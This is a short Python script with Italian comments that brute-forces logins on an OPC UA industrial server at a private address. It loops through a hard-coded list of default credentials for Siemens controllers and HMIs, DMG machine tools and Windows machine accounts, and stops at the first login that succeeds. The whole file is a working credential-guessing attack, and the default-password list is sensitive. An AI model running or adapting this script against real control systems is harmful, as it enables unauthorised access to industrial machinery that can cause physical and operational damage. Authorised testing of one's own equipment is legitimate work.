# brute_opcua.py
import asyncio
from asyncua import Client

async def prova(username, password):
    url = "opc.tcp://10.95.20.29:4840"
    client = Client(url=url)
    client.set_user(username)
    client.set_password(password)
    try:
        await client.connect()
        print(f"✓ FUNZIONA: {username} / {password}")
        await client.disconnect()
        return True
    except Exception as e:
        print(f"✗ {username} / {password}")
        return False

async def main():
    credenziali = [
        # Siemens default
        ("OpcUaClient", "OpcUaClient"),
        ("OpcUaClient", ""),
        ("OpcUaClient", "siemens"),
        ("OpcUaClient", "Siemens1"),
        # DMG specifici
        ("DMG", "DMG"),
        ("dmg", "dmg"),
        ("OpcUa", "OpcUa"),
        ("opcua", "opcua"),
        # Windows utente macchina
        ("manufact", "SUNRISE"),
        ("manufact", "manufact"),
        ("administrator", "SUNRISE"),
        ("administrator", "administrator"),
        ("user", "user"),
        ("User", "User"),
        # Siemens HMI
        ("auduser", "SUNRISE"),
        ("auduser", "auduser"),
        ("siemens", "siemens"),
        ("Siemens", "Siemens"),
    ]
    
    for user, pwd in credenziali:
        ok = await prova(user, pwd)
        if ok:
            return

asyncio.run(main())